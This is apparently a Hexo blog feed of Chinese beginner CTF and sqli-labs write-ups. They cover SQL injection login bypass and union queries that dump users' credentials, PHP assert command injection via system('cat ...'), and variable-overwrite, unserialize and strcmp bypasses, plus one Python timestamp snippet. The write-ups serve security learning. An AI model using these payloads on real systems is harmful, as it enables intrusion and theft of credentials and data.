=&apos;fuzz&apos;返回失败</code></pre><p>数据库是不会存在username为NULL的字段的，所以第一句返回的是失败，第三句中，因为password是我们随便输入的，99.99%是不会存在这个密码的，于是AND之后，我们的第三句也是失败的，所以整个语句返回失败的</p><p>但是我们的password情况就不一样了</p><pre><code>SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos;or&apos;&apos;=&apos;&apos;</code></pre><p>这里我们第一句是返回失败的，但是我们的第二句’’=’’是返回成功的，OR逻辑是有一个是成功就返回成功，于是我们的整个语句就会返回成功</p><p>返回成功之后我们就会绕过登录表单直接登录系统了<br>5.终止式sql注入<br>终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句</p><p>于是被注释的查询不会被执行，我们还是拿上面那个例子举例</p><pre><code>我们上面已经知道，在username框内填入&apos; or &apos;&apos;=&apos;程序是不会返回成功的，我们就没有办法在username做文章了吗？</code></pre><p>错了，我们还有终止式</p><p>还是上面那个SQL查询语句</p><p>SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’</p><p>这里我们构造如下username输入</p><pre><code>&apos; or &apos;&apos;=&apos;&apos; --</code></pre><p>之后我们就可以得到如下的查询语句</p><pre><code>SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; --&apos; AND password =&apos;fuzz&apos;</code></pre><p>这里的fuzz是我们随便输入的，–是注释符</p><p>这样，我们的语句就可以分为三个部分了</p><pre><code>SELECT * FROM admin WHER username=&apos;&apos;or &apos;&apos;=&apos;&apos; 返回成功--&apos; AND password =&apos;fuzz&apos;</code></pre><p>第一句肯定是返回失败的，但是我们第二句会返回成功</p><p>后面已经被我们注释掉了，是不会执行的，所以我们还是可以通过在username做这个手脚来绕过登录</p><p>下面是我们常见的一些终止方式<br>终止字符串：</p><p>– ， #， %23， %00， /*<br>终止方法：</p><p>– , ‘– , ‘)– , ) – , ‘)) –, ))–</p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab 学习记录 less3-less4</title>
      <link href="/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/"/>
      <url>/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/</url>
      
        <content type="html"><![CDATA[<h2 id="sqli-lab-学习记录-less3-less4"><a href="#sqli-lab-学习记录-less3-less4" class="headerlink" title="sqli-lab 学习记录  less3-less4"></a>sqli-lab 学习记录  less3-less4</h2><a id="more"></a><p>less3:<br>进入界面<br>我们先进行判断注入的类型<br>我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1</span><br></pre></td></tr></table></figure><p>有正常回显<br>之后我们在输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br><span class="line"></span><br><span class="line">发现出现了：</span><br><span class="line">![在这里插入图片描述](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190319192230358.png)根据后面的报错我们可以大致的判断此sql语句是这样的：</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure><p>之后呢，我们来验证我们的判断<br>我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;) %23</span><br></pre></td></tr></table></figure><p>得到正常回显<br><img src="https://img-blog.csdnimg.cn/20190319192814704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>因此我们就确定了注入类型<br>之后的步骤就和我们之前做less1与2一样了<br>这里就不过多解释了</p><p>less4<br>我们还是一样判断注入类型<br>(这个类型与less3相似，但是爆出错误却很难)<br>我刚开始输入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1</span><br><span class="line">?id&#x3D;1&#39;</span><br><span class="line">?id&#x3D;1 and 1&#x3D;2</span><br></pre></td></tr></table></figure><p>均有回响<br>弄得我一脸懵逼<br>之后尝试使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure><p>终于爆出了错误<br><img src="https://img-blog.csdnimg.cn/2019031920140258.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">从错误中我们大致可以判断<br>应该是类似于<br>（“ $id ”）<br>我们可以构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;) %23</span><br></pre></td></tr></table></figure><p>得到正常回显<br>之后我们的步骤和之前一样就可以了</p><p>萌新文章，还请大佬们指导<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab less1</title>
      <link href="/2019/12/16/sqli-lab%20less1/"/>
      <url>/2019/12/16/sqli-lab%20less1/</url>
      
        <content type="html"><![CDATA[<h2 id="sqli-lab-学习记录"><a href="#sqli-lab-学习记录" class="headerlink" title="sqli-lab  学习记录"></a>sqli-lab  学习记录</h2><a id="more"></a><p>Less 1<br>1，我们先要爆出他的字段数，即列的数目<br>插入知识：<br>information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。<br>感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。<br>数据库拥有一个名为tables的数据表，<br>该表包含两个字段table_name和table_schema,分别记录DBMS中的存储的表名和表名所在的数据库。</p><p>’ or 1=1 –+ （–后要加空格才能注释，但是在网址栏输入时最后加空格解析时会被去掉，所以用+，当然用%20也行）<br>’ or 1=1 # （火狐下在url栏用#注释会报错，改成url编码%23即可）<br>我们使用如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 1 %23</span><br><span class="line">?id&#x3D;1&#39; order by 2 %23</span><br><span class="line">?id&#x3D;1&#39; order by 3 %23</span><br></pre></td></tr></table></figure><p>当我们进行到order by 4 %23时，我们发现报错，所以我们判断有三列<br>对了，要判断注入点<br>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p>会报错<br>显示<br><img src="https://img-blog.csdnimg.cn/20190314203258751.png" alt="在这里插入图片描述">所以差不多我们输入的就放在了这对引号内<br>ok<br>2.之后我们进行爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23</span><br></pre></td></tr></table></figure><p>得到了<br><img src="https://img-blog.csdnimg.cn/20190314203625178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们判断用户名在users中<br>之后爆列喽<br>附加一些资料<br><img src="https://img-blog.csdnimg.cn/20190314204021330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/2019031420403782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; %23</span><br></pre></td></tr></table></figure><p>得到：<br><img src="https://img-blog.csdnimg.cn/20190314204850959.png" alt="在这里插入图片描述">之后我们再得到我们需要的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,group_concat(id,username,password),3 from users %23</span><br></pre></td></tr></table></figure><p>最后我们就得到了我们想要的：<br><img src="https://img-blog.csdnimg.cn/20190314205154204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">累死了，，，加油吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>jarvis OJ web babyphp</title>
      <link href="/2019/12/16/jarvis%20OJ%20web%20babyphp/"/>
      <url>/2019/12/16/jarvis%20OJ%20web%20babyphp/</url>
      
        <content type="html"><![CDATA[<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><a id="more"></a><p>考完二级后我又要回归web狗了<br>今天做到一道web题<br>上题：<br><a href="http://web.jarvisoj.com:32798/" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/</a></p><p>进入后：<br>发现应该有git泄露<br>因此我们使用githack进行获得源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">打开cmd</span><br><span class="line">输入：python2 GitHack.py http:&#x2F;&#x2F;web.jarvisoj.com:32798&#x2F;.git&#x2F;</span><br><span class="line">#这里的python2是我设置的用于区分python3</span><br><span class="line">即这个脚本要使用python2</span><br></pre></td></tr></table></figure><p>之后我们得到源码：</p><p>当然如果我们直接在打开flag.php的话没用的，因为emmm标志被注释掉了<br><img src="https://img-blog.csdnimg.cn/20190402200211913.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20190402200311594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们重点来看这里：<br>assert（）函数<br><img src="https://img-blog.csdnimg.cn/20190402200415600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个我也不算太懂，但是只要是这一句话<br>如果assertion是字符串，那么此字符串会被当做php代码执行<br>因此我们就可以进行php注入（我的第一次php注入）<br>我们在url后面输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;&#39;. system(&quot;cat templates&#x2F;flag.php&quot;).&#39;</span><br></pre></td></tr></table></figure><p>这个代码的意思是打开flag.php 所在的templates文件中的此文件<br>为什么知道他在那里，因为有：<br><img src="https://img-blog.csdnimg.cn/20190402203454570.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190402203521735.png" alt="在这里插入图片描述"></p><p>输入payload后我们查看源代码得到flag<br><img src="https://img-blog.csdnimg.cn/20190402203613988.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为什么要查看源码才能看到了，因为标志被注释了呀（源代码的那部分是绿色的）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python将时间戳转化为时间</title>
      <link href="/2019/12/16/python%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E5%8C%96%E4%B8%BA%E6%97%B6%E9%97%B4/"/>
      <url>/2019/12/16/python%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E5%8C%96%E4%B8%BA%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="python将时间戳转化为时间"><a href="#python将时间戳转化为时间" class="headerlink" title="python将时间戳转化为时间"></a>python将时间戳转化为时间</h1><a id="more"></a><p>title:第一篇博客：python时间转换（将时间戳转化为时间）<br>date: 2019-02-014 22:37:58<br>tags:<br>    python的os.path模块中有着这样的一个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.path.getatime()    #获得文件的最近访问时间</span><br><span class="line">os.path.getctime()    #获得文件的创建时间</span><br><span class="line">os.path.getmtime()   #获得文件的修改时间</span><br></pre></td></tr></table></figure><p>我们就以第一个函数为例<br>os.path.getatime()<br>1.首先使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.localtime()     #将其转换为localtime的格式</span><br></pre></td></tr></table></figure><p>2.将转化过来的时间进行格式化，使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.strftime(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)    #temp为转化过来的localtime格式时间</span><br></pre></td></tr></table></figure><p>3.最后输出就行了<br>完整的过程如下所示：`</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">temp &#x3D; time.localtime(os.path.getatime(&quot;python.exe&quot;))</span><br><span class="line">#获取python.exe的最近访问时间，并将其localtime化</span><br><span class="line">temp1 &#x3D; time.strftime(&quot;(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)</span><br><span class="line">#将temp格式化</span><br><span class="line">print(temp1)</span><br></pre></td></tr></table></figure><p>（这是我第一次写博客，有啥不好的，大佬指教）<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>issctf     web1</title>
      <link href="/2019/12/16/issctf%20%20%20%20%20web1/"/>
      <url>/2019/12/16/issctf%20%20%20%20%20web1/</url>
      
        <content type="html"><![CDATA[<h2 id="标题issctf-中最简单的一个web题（耗费了我一个小时。。。。）"><a href="#标题issctf-中最简单的一个web题（耗费了我一个小时。。。。）" class="headerlink" title="标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）"></a>标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）</h2><a id="more"></a><p>题目涉及知识点：<br>1.php 中的几个函数（等会列举）<br>2.php parse_str引起的变量覆盖漏洞</p><!--more--><p>一、<br>我们要了解的php函数即方法<br>$<em>SERVER[‘REQUEST_URI’]<br>parse_url<br>parse_str<br>二、<br>由parse_str引起的变量覆盖漏洞<br>parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>ok<br>三、<br>接下来打开题目<br>&lt;?php<br>error_reporting(0);<br>include(“flag.php”); $hashed_key = ‘ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a’; $parsed = parse_url($<em>SERVER[‘REQUEST_URI’]);<br>if(isset($parsed[“query”])){<br>    $query = $parsed[“query”];<br>    $parsed_query = parse_str($query);<br>    if($parsed_query!=NULL){<br>        $action = $parsed_query[‘action’];<br>    }<br>    if($action===”auth”){<br>        $key = $_GET[“key”];<br>        $hashed_input = hash(‘sha256’, $key);<br>        if($hashed_input!==$hashed_key){<br>            die(“<img src='cxk.jpg'>“);<br>        }<br>        echo $flag;<br>    }<br>}else{<br>    show_source(__FILE</em></em>);<br>}?&gt;</p><p>我们只需构造一个get传入<br>是action=auth<br>且将<br>hashed_key变量进行覆盖，传入你想传入的经过sha256后的值<br>最后传入key即可<br>样本<br>?action=auth&amp;hashed_key=xxxxxxx&amp;key=xxx</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>flag.php bugku  web</title>
      <link href="/2019/12/16/flag.php%20bugku%20%20web/"/>
      <url>/2019/12/16/flag.php%20bugku%20%20web/</url>
      
        <content type="html"><![CDATA[<h2 id="bugku-web-flag-php"><a href="#bugku-web-flag-php" class="headerlink" title="bugku    web        flag.php"></a><strong>bugku    web        flag.php</strong></h2><a id="more"></a><p>打开题目网页<br>首先尝试了一下简单的sql注入<br>但是没用<br><img src="https://img-blog.csdnimg.cn/20190308190046343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">想了一会后，发现提示hint<br>所以我们尝试一下使用get方法传入hint任意值<br>即?hint=1<br>传入后发现一页代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>之后我们查看开头的代码<br>发现要将cookie指进行序列化后<br>使与key值相等即可得到flag<br>但是<br>注意：下方的key值并不是我们需要的<br>而我们需要的key值在程序中并没有赋值<br>因此为NULL<br>所以有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$KEY&#x3D;&quot;&quot;;</span><br><span class="line">print(serialize($KEY));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>因为我们并没有对$key进行赋值因此求序列化的程序如上所示<br>之后我们可以使用火狐上的hackbar<br>上传cookies<br>即ISecer=s:0:””%3b<br>因为；无法上传 ， 因此我们使用其的url码上传<br>注意，上传的时候要在没有get  hint的页面中进行<br>否则无法显示flag</p><p>萌新  还请大佬指教<br>邮箱：<a href="mailto:497710073@qq.com">497710073@qq.com</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>extract（）变量漏洞</title>
      <link href="/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/12/16/extract%EF%BC%88%EF%BC%89%E5%8F%98%E9%87%8F%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="php代码审计日志一（bugku-extract变量覆盖）"><a href="#php代码审计日志一（bugku-extract变量覆盖）" class="headerlink" title="php代码审计日志一（bugku  extract变量覆盖）"></a>php代码审计日志一（bugku  extract变量覆盖）</h2><a id="more"></a><p>题目来源：bugku<br>代码为：<br><img src="https://img-blog.csdnimg.cn/20190309083831775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们先了解一下extract（）函数<br><img src="https://img-blog.csdnimg.cn/20190309083932380.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后我们再了解一下php中的extract（）漏洞</p><p><img src="https://img-blog.csdnimg.cn/2019030908412227.png" alt="在这里插入图片描述"><br>第一次我所构造的为：<br>?shiyan=1&amp;flag=1<br>但是不行<br>我查了一些大佬的wp后发现有：<br><img src="https://img-blog.csdnimg.cn/20190309084444350.png" alt="在这里插入图片描述">之后我们就可以得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>csdn_export_md</title>
      <link href="/2019/12/16/csdn_export_md/"/>
      <url>/2019/12/16/csdn_export_md/</url>
      
        <content type="html"><![CDATA[<h2 id="代码审计之strcmp（）漏洞"><a href="#代码审计之strcmp（）漏洞" class="headerlink" title="代码审计之strcmp（）漏洞"></a>代码审计之strcmp（）漏洞</h2><a id="more"></a><p>先了解一下此漏洞：<br><strong>strcmp(str1,str2)比较两个字符串，如果相等就返回0。</strong></p><p>在5.3版本前，如果传入的不是字符串，那么会报错，并且return 0，返回0就代表相等了。<br>绕过strcmp就想办法传入数组吧，只需要v3[]=3即可。</p><p>之后我们通过一个题来做一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class="line">if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">&#x2F;&#x2F;比较两个字符串（区分大小写）</span><br><span class="line">die(&#39;Flag: &#39;.$flag);</span><br><span class="line">else</span><br><span class="line">print &#39;No&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>因此我们可以构造<br>?a[]=1<br>即可得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bugku成绩单</title>
      <link href="/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/"/>
      <url>/2019/12/16/bugku%E6%88%90%E7%BB%A9%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h2 id="bugku成绩单-详细解析"><a href="#bugku成绩单-详细解析" class="headerlink" title="bugku成绩单  详细解析"></a>bugku成绩单  详细解析</h2><a id="more"></a><p>1，我们首先分别输入1,2,3，<br>均有输出<br>我们输入1’<br>没有回响<br>因此我们可以判断存在sql注入<br>2.我们分别输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 1#</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; order by 3#</span><br><span class="line">1&#39; order by 4#</span><br></pre></td></tr></table></figure><p>均有回响<br>但是当我们使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 5#</span><br></pre></td></tr></table></figure><p>时，没有回响<br>因此我们可以根据此判断字段数为4<br>3，<br>之后就是最精彩的地方了<br>之后我们联合查询<br>我们先输入<br>注意（select好像tm的不是查询，，好像是赋值。。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,3,4#</span><br></pre></td></tr></table></figure><p>没有显示有用的东西<br>因为id=1  所以我们的东西被覆盖<br>因此呢<br>我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5&#39; union select 1,2,3,database()#</span><br></pre></td></tr></table></figure><p>即设置一个新的id，我们要select的值会显示在表上（覆盖）<br><img src="https://img-blog.csdnimg.cn/20190309162426694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>现在我们得到了一个数据库的名字<br>之后就进行爆表<br>5’union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>得到<br><img src="https://img-blog.csdnimg.cn/20190309163625472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">之后再进行获得里面的列<br>‘ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#<br>得到<br><img src="https://img-blog.csdnimg.cn/20190309164001253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们得到了列<br>之后我们获取我们要得到的东西<br>5’ union select 1,2,3,skctf_flag from fl4g#<br><img src="https://img-blog.csdnimg.cn/20190309164216346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjc3MzI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">得到flag</p><p>之后我会写一些关于sql语句的总结</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
